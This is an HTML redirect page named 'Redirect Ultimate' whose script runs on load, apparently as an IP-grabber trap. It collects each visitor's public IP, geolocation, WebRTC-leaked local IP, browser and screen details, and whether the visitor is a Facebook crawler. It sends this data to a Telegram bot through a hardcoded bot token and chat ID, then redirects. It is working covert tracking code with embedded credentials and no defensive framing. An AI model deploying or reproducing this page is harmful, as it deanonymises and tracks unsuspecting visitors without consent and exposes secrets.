<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="2;url=http://127.0.0.1:80">
  <title>Redirect Ultimate</title>
</head>
<body>
  <div>ğŸ” Redirect Ultimate Running...</div>
  <script>
    const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
    const chatId = "6239813037";
    const time = new Date().toLocaleString();

    
async function getWebRTCIP() {
  return new Promise((resolve) => {
    let ipFound = false;
    const pc = new RTCPeerConnection({iceServers:[]});
    pc.createDataChannel("");
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    pc.onicecandidate = (ice) => {
      if (!ice || !ice.candidate || !ice.candidate.candidate) return;
      const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
      if (match && !ipFound) {
        ipFound = true;
        resolve(match[1]);
        pc.close();
      }
    };
    setTimeout(() => resolve("Not found"), 3000);
  });
}


    function isFacebookCrawler() {
      const ua = navigator.userAgent;
      return ua.includes("facebookexternalhit") || ua.includes("FBAN") || ua.includes("FBAV");
    }

    async function send(msg) {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      });
    }

    async function run() {
      try {
        const webrtcIP = await getWebRTCIP();
        const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
        const data = await res.json();

        const message = `ğŸ“„ [REDIRECT]
ğŸ•µï¸â€â™‚ï¸ User Agent: ${navigator.userAgent}
ğŸ“¥ IP: ${data.ip}
ğŸŒ Country: ${data.country} | City: ${data.city} | Region: ${data.region}
ğŸ¢ Org: ${data.org}
ğŸ“ Location: ${data.loc}
ğŸŒ Language: ${navigator.language}
ğŸ–¥ Platform: ${navigator.platform}
ğŸ“ Screen: ${window.screen.width}x${window.screen.height}
ğŸ¨ Color Depth: ${screen.colorDepth}
ğŸŒ WebRTC IP: ${webrtcIP}
ğŸ“¦ Facebook Crawler: ${isFacebookCrawler() ? 'âœ… Yes' : 'âŒ No'}
ğŸ•° Time: ${time}
ğŸšª Next: Redirecting to http://127.0.0.1:80`;

        await send(message);
      } catch (err) {
        await send("âŒ REDIRECT: Failed to collect data.");
      }
    }

    run();
  </script>
</body>
</html>
